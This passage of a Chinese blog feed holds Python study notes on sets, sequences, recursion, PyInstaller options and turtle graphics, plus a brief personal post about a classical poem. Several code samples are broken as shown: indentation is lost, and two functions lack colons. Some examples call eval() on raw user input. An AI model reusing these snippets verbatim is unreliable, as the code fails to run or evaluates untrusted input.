title="集合处理方法"></a>集合处理方法</h3><table><thead><tr><th>操作函数或方法</th><th>描述</th></tr></thead><tbody><tr><td>S.add(x)</td><td>如果x不在集合S中，将x增加到S</td></tr><tr><td>S.discard(x)</td><td>移除S中的元素x，如果x不在集合S中，不报错</td></tr><tr><td>S.remove(x)</td><td>移除S中的元素x，如果x不在集合S中，产生KeyError异常</td></tr><tr><td>S.clear()</td><td>移除S中所有元素</td></tr><tr><td>S.pop()</td><td>随机返回一个元素，更新S，若S为空产生KeyError异常</td></tr><tr><td>S.copy()</td><td>返回集合S的一个副本</td></tr><tr><td>len(S)</td><td>返回集合S中的元素个数</td></tr><tr><td>x in S</td><td>判断S中是否含有元素x，若含有返回True，否则返回False</td></tr></tbody></table><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li>包含关系比较</li><li>数据去重：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">ls = [<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-number">123</span>]<br>s = <span class="hljs-built_in">set</span>(ls)<br>lt = <span class="hljs-built_in">list</span>(s)<br></code></pre></td></tr></table></figure></li></ul><h2 id="序列类型及操作"><a href="#序列类型及操作" class="headerlink" title="序列类型及操作"></a>序列类型及操作</h2><h3 id="序列类型定义"><a href="#序列类型定义" class="headerlink" title="序列类型定义"></a>序列类型定义</h3><p><strong>序列是具有先后关系的一组元素。</strong></p><ul><li>序列是一维元素向量，元素类型可以不同</li><li>类似数学元素序列</li><li>元素间由序号引导，通过下标访问特定元素</li></ul><h3 id="序列处理函数及方法"><a href="#序列处理函数及方法" class="headerlink" title="序列处理函数及方法"></a>序列处理函数及方法</h3><p>6个操作符：</p><p><img src="/images/xlczf.png"></p><p>5个函数方法：</p><table><thead><tr><th>函数和方法</th><th>描述</th></tr></thead><tbody><tr><td>len(s)</td><td>返回s的长度</td></tr><tr><td>min(s)</td><td>返回序列s的最小元素，s中元素需要可比较</td></tr><tr><td>max(s)</td><td>返回序列s的最大元素，s中元素需要可比较</td></tr><tr><td>s.index(x)或s.index(x,i,j)</td><td>返回序列s从i开始到j位置中第一次出现元素x的位置</td></tr><tr><td>s.count(x)</td><td>返回序列s中出现x的总次数</td></tr></tbody></table><h3 id="元组类型及操作"><a href="#元组类型及操作" class="headerlink" title="元组类型及操作"></a>元组类型及操作</h3><p>定义：<strong>元组是序列类型的一种扩展</strong></p><ul><li>元组是一种序列类型，一旦创建就不能被修改</li><li>使用小括号或tuple()创建，元素间用逗号分隔</li><li>可以使用或不使用小括号</li><li>继承序列类型全部通用操作</li></ul><h3 id="列表类型及操作"><a href="#列表类型及操作" class="headerlink" title="列表类型及操作"></a>列表类型及操作</h3><p><strong>列表是序列类型的一种扩展，很常用</strong></p><p><img src="/images/lbczf.png"></p><p><img src="/images/lbczf1.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python函数和代码复用(二)</title>
    <link href="/blog/2018/08/15/Python%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A8-%E4%BA%8C/"/>
    <url>/blog/2018/08/15/Python%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A8-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<p><strong>今天继续学习一下Python函数和代码复用。</strong><br><img src="/images/fj6.jpg"></p><span id="more"></span><h2 id="代码复用和函数递归"><a href="#代码复用和函数递归" class="headerlink" title="代码复用和函数递归"></a>代码复用和函数递归</h2><h3 id="代码复用与模块化设计"><a href="#代码复用与模块化设计" class="headerlink" title="代码复用与模块化设计"></a>代码复用与模块化设计</h3><p><strong>代码复用：同一份代码在需要的时间可以被重复使用</strong></p><p>分而治之：</p><ul><li>通过函数或对象封装，将程序划分为模块及模块间的表达</li><li>具体包括：主程序、子程序和子程序之间的关系</li><li>分而治之：一种分而治之、分层抽象、体系化的设计思想</li></ul><p>紧耦合：两部分之间交流很多，无法独立存在<br>松耦合：两部分之间交流较少，可以独立存在</p><p>模块内部尽量紧耦合，模块之间尽量松耦合</p><h3 id="函数递归"><a href="#函数递归" class="headerlink" title="函数递归"></a>函数递归</h3><p>递归的实现：<br>计算n！：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n</span>):<br><span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> n*fact(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>递归实现字符串反转：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rvs</span>(<span class="hljs-params">s</span>):<br><span class="hljs-keyword">if</span> s == <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">return</span> s<br><span class="hljs-keyword">else</span> :<br><span class="hljs-keyword">return</span> rvs(s[<span class="hljs-number">1</span>:])+s[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>斐波那契数列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">n</span>):<br><span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> n == <span class="hljs-number">2</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span> :<br><span class="hljs-keyword">return</span> f(n-<span class="hljs-number">1</span>) + f(n-<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>汉诺塔：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hanoi</span>(<span class="hljs-params">n,src,dst,mid</span>):  <span class="hljs-comment">#src 原来的柱子 dst目的柱子 mid中间过度柱子</span><br><span class="hljs-keyword">global</span> count<br><span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span> :<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>,src,dst))<br>count +=<span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>hanoi(n-<span class="hljs-number">1</span>,src,mid,dst)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(n,src,dst))<br>count +=<span class="hljs-number">1</span><br>hanoi(n-<span class="hljs-number">1</span>,mid,dst,src)<br></code></pre></td></tr></table></figure><p><img src="/images/hnt.png"></p><h2 id="Pyinstall库的使用"><a href="#Pyinstall库的使用" class="headerlink" title="Pyinstall库的使用"></a>Pyinstall库的使用</h2><p><strong>概述：将.py源代码转换成无需源代码的可执行文件</strong><br>简单总结PyInstaller使用方法：<br>生成单一的exe文件：<br>pyinstaller -F test.py<br><img src="/images/pyinstaller.png"></p><p>下面对pyinstall库的使用进行详细介绍：</p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>-F, –onefile</td><td>产生一个文件用于部署 .</td></tr><tr><td>-D, –onedir</td><td>产生一个目录用于部署 (默认)</td></tr><tr><td>-K, –tk</td><td>在部署时包含 TCL&#x2F;TK</td></tr><tr><td>-a, –ascii</td><td>不包含编码.在支持Unicode的python版本上默认包含所有的编码.</td></tr><tr><td>-d, –debug</td><td>产生debug版本的可执行文件</td></tr><tr><td>-w,–windowed,–noconsole</td><td>使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)</td></tr><tr><td>-c,–nowindowed,–console</td><td>使用控制台子系统执行(默认)(只对Windows有效)</td></tr><tr><td>-s,–strip</td><td>可执行文件和共享库将run through strip.注意Cygwin的strip往往使普通的win32 Dll无法使用.</td></tr><tr><td>-X, –upx</td><td>如果有UPX安装(执行Configure.py时检测),会压缩执行文件(Windows系统中的DLL也会)</td></tr><tr><td>-o DIR, –out&#x3D;DIR</td><td>指定spec文件的生成目录,如果没有指定,而且当前目录是PyInstaller的根目录,会自动创建一个用于输出(spec和生成的可执行文件)的目录.如果没有指定,而当前目录不是PyInstaller的根目录,则会输出到当前的目录下.</td></tr><tr><td>-p DIR, –path&#x3D;DIR</td><td>设置导入路径(和使用PYTHONPATH效果相似).可以用路径分割符(Windows使用分号,Linux使用冒号)分割,指定多个目录.也可以使用多个-p参数来设置多个导入路径</td></tr><tr><td>–icon&#x3D;&lt;FILE.ICO&gt;</td><td>将file.ico添加为可执行文件的资源(只对Windows系统有效)</td></tr><tr><td>–icon&#x3D;&lt;FILE.EXE,N&gt;</td><td>将file.exe的第n个图标添加为可执行文件的资源(只对Windows系统有效)</td></tr><tr><td>-v FILE, –version&#x3D;FILE</td><td>将verfile作为可执行文件的版本资源(只对Windows系统有效)</td></tr><tr><td>-n NAME, –name&#x3D;NAME</td><td>可选的项目(产生的spec的)名字.如果省略,第一个脚本的主文件名将作为spec的名字</td></tr></tbody></table><p>实例：pyinstaller -i curve.ico -F 文件名.py #将图标与程序链接</p><h2 id="科赫小雪花绘图："><a href="#科赫小雪花绘图：" class="headerlink" title="科赫小雪花绘图："></a>科赫小雪花绘图：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> turtle<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">koch</span>(<span class="hljs-params">size, n</span>):<br>    <span class="hljs-keyword">if</span> n== <span class="hljs-number">0</span>:<br>        turtle.fd(size)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> angle <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">60</span>, -<span class="hljs-number">120</span>, <span class="hljs-number">60</span>]:<br>            turtle. left(angle)<br>            koch(size/<span class="hljs-number">3</span>, n-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    turtle.setup(<span class="hljs-number">600</span>, <span class="hljs-number">600</span>)<br>    turtle.penup()<br>    turtle.pencolor(<span class="hljs-string">&quot;pink&quot;</span>)<br>    turtle.speed(<span class="hljs-number">0</span>)<br>    turtle.goto( - <span class="hljs-number">200</span>, <span class="hljs-number">100</span>)<br>    turtle.pendown()<br>    turtle.pensize(<span class="hljs-number">2</span>)<br>    level = <span class="hljs-number">4</span><br>    koch(<span class="hljs-number">400</span> ,level)<br>    turtle. right (<span class="hljs-number">120</span>)<br>    koch(<span class="hljs-number">400</span>,level)<br>    turtle. right(<span class="hljs-number">120</span>)<br>    koch(<span class="hljs-number">400</span>,level)<br>    turtle.hideturtle()<br>main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>木兰词·拟古决绝词柬友</title>
    <link href="/blog/2018/08/10/%E6%9C%A8%E5%85%B0%E8%AF%8D%C2%B7%E6%8B%9F%E5%8F%A4%E5%86%B3%E7%BB%9D%E8%AF%8D%E6%9F%AC%E5%8F%8B/"/>
    <url>/blog/2018/08/10/%E6%9C%A8%E5%85%B0%E8%AF%8D%C2%B7%E6%8B%9F%E5%8F%A4%E5%86%B3%E7%BB%9D%E8%AF%8D%E6%9F%AC%E5%8F%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>人生若只如初见，何事秋风悲画扇。<br>等闲变却故人心，却道故人心易变。<br>骊山语罢清宵半，泪雨零铃终不怨。<br>何如薄幸锦衣郎，比翼连枝当日愿。</strong><br><img src="/images/suibi1.jpg"></p><span id="more"></span><p>这就是我的几乎所有社交账号昵称的来历，不知道什么时候，也忘记了具体因为感慨什么，就喜欢上了这首诗，也喜欢上了“初见”，因为“初见”总是那么美好！</p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python函数和代码复用(一)</title>
    <link href="/blog/2018/08/09/Python%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A8(%E4%B8%80)/"/>
    <url>/blog/2018/08/09/Python%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A8(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一下Python函数和代码复用，进一步学习python。</strong><br><img src="/images/fj5.jpg"></p><span id="more"></span><h2 id="函数的定义和使用"><a href="#函数的定义和使用" class="headerlink" title="函数的定义和使用"></a>函数的定义和使用</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><p><strong>函数是一段代码的表示</strong></p><ul><li>函数是一段具有特定功能的、可重用的语句组</li><li>函数是一种功能的抽象，一般函数表达特定功能</li><li>两个作用：<strong>降低编程难度</strong>和<strong>代码复用</strong><br>案例：计算n！<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n</span>):<br>s = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>s *= i<br><span class="hljs-keyword">return</span> s<br></code></pre></td></tr></table></figure></li></ul><h3 id="函数的使用和调用过程"><a href="#函数的使用和调用过程" class="headerlink" title="函数的使用和调用过程"></a>函数的使用和调用过程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n</span>):<br>s = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>s *= i<br><span class="hljs-keyword">return</span> s<br>a = fact(<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><h3 id="函数的参数传递"><a href="#函数的参数传递" class="headerlink" title="函数的参数传递"></a>函数的参数传递</h3><p>函数可以有参数，也可以没有，但必须保留括号 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> &lt;函数名&gt;():<br>&lt;函数体&gt;<br><span class="hljs-keyword">return</span> &lt;返回值&gt;<br></code></pre></td></tr></table></figure><p>可选参数传递：函数定义时可以为某些参数指定默认值，构成可选参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> &lt;函数名&gt;(&lt;非可选参数&gt;,&lt;可选参数&gt;):<br>&lt;函数体&gt;<br><span class="hljs-keyword">return</span> &lt;返回值&gt;<br></code></pre></td></tr></table></figure><p>可变参数传递：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> &lt;函数名&gt;(&lt;参数&gt;,*b):<br>&lt;函数体&gt;<br><span class="hljs-keyword">return</span> &lt;返回值&gt;<br></code></pre></td></tr></table></figure><p>实例：计算n！乘数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n,*b</span>):<br>s = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>s *= i<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> b:<br>s *= item<br><span class="hljs-keyword">return</span> s<br></code></pre></td></tr></table></figure><p>参数传递的两种参数：按位置或者按名称</p><h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h3><p>可以返回0个或多个元组类型的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n,m=<span class="hljs-number">1</span></span>):<br>s = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>s *= i<br><span class="hljs-keyword">return</span> s//m,n,m<br>a,b,c = fact(<span class="hljs-number">10</span>,<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h3><ul><li>局部变量和全局变量是不同变量</li><li>函数中使用全局变量：使用global关键字</li><li>局部变量为组合数据类型且未创建，等同于全局变量</li></ul><h3 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h3><p>&lt;函数名&gt; &#x3D; lambda&lt;参数&gt;:&lt;表达式&gt;<br> f &#x3D; lambda x,y : x+y<br><strong>lambda 函数谨慎使用</strong></p><h2 id="实例：七段数码管绘制"><a href="#实例：七段数码管绘制" class="headerlink" title="实例：七段数码管绘制"></a>实例：七段数码管绘制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> turtle <span class="hljs-keyword">as</span> t<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drawLine</span>(<span class="hljs-params">draw</span>):  <span class="hljs-comment">#绘制单段数码管</span><br>t.pendown() <span class="hljs-keyword">if</span> draw <span class="hljs-keyword">else</span> t.penup()<br>t.fd(<span class="hljs-number">40</span>)<br>t.right(<span class="hljs-number">90</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drawDigit</span>(<span class="hljs-params">digit</span>):  <span class="hljs-comment">#根据数字绘制七段数码管</span><br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>t.left(<span class="hljs-number">90</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>t.left(<span class="hljs-number">180</span>)<br>t.penup()<br>t.fd(<span class="hljs-number">20</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drawDate</span>(<span class="hljs-params">date</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> date:<br>drawDigit(<span class="hljs-built_in">eval</span>(i))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>t.setup(<span class="hljs-number">800</span>,<span class="hljs-number">350</span>)<br>t.penup()<br>t.fd(-<span class="hljs-number">300</span>)<br>t.pensize(<span class="hljs-number">5</span>)<br>t.pencolor(<span class="hljs-string">&#x27;red&#x27;</span>)<br>drawDate(time.strftime(<span class="hljs-string">&#x27;%Y%m%d&#x27;</span>,time.gmtime()))<br>t.hideturtle()<br>t.done()<br>main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python程序的控制结构</title>
    <link href="/blog/2018/08/06/Python%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84/"/>
    <url>/blog/2018/08/06/Python%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一下python程序的分支和循环结构以及random库的使用。</strong><br><img src="/images/fj4.jpg"></p><span id="more"></span><h2 id="程序的分支结构"><a href="#程序的分支结构" class="headerlink" title="程序的分支结构"></a>程序的分支结构</h2><h3 id="单分支结构"><a href="#单分支结构" class="headerlink" title="单分支结构"></a>单分支结构</h3><p>if &lt;条件&gt; :<br>    &lt;语句块&gt;<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">guess = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> guess == <span class="hljs-number">99</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;猜对了&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="二分支结构"><a href="#二分支结构" class="headerlink" title="二分支结构"></a>二分支结构</h3><p>if &lt;条件&gt; :<br>    &lt;语句块1&gt;<br>else:<br>    &lt;语句块2&gt;<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">guess = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> guess == <span class="hljs-number">99</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;猜对了&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;猜错了&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="多分支结构"><a href="#多分支结构" class="headerlink" title="多分支结构"></a>多分支结构</h3><p>if &lt;条件&gt; :<br>    &lt;语句块1&gt;<br>elif&lt;条件&gt;:<br>    &lt;语句块2&gt;<br>else:<br>    &lt;语句块3&gt;<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python">score = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> score &gt;= <span class="hljs-number">90</span>:<br>grade = <span class="hljs-string">&quot;A&quot;</span><br><span class="hljs-keyword">elif</span> score &gt;=<span class="hljs-number">80</span>:<br>grade = <span class="hljs-string">&quot;B&quot;</span><br><span class="hljs-keyword">elif</span> score &gt;=<span class="hljs-number">60</span>:<br>grade = <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-keyword">else</span>:<br>grade = <span class="hljs-string">&quot;D&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;输入成绩属于级别&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(grade))<br></code></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>try:<br>    &lt;语句块1&gt;<br>except:<br>    &lt;语句块2&gt;<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">try</span>:<br>num = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个整数：&quot;</span>))<br><span class="hljs-built_in">print</span>(num**<span class="hljs-number">2</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;输入不是整数&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="实例：身体质量指数BMI"><a href="#实例：身体质量指数BMI" class="headerlink" title="实例：身体质量指数BMI"></a>实例：身体质量指数BMI</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 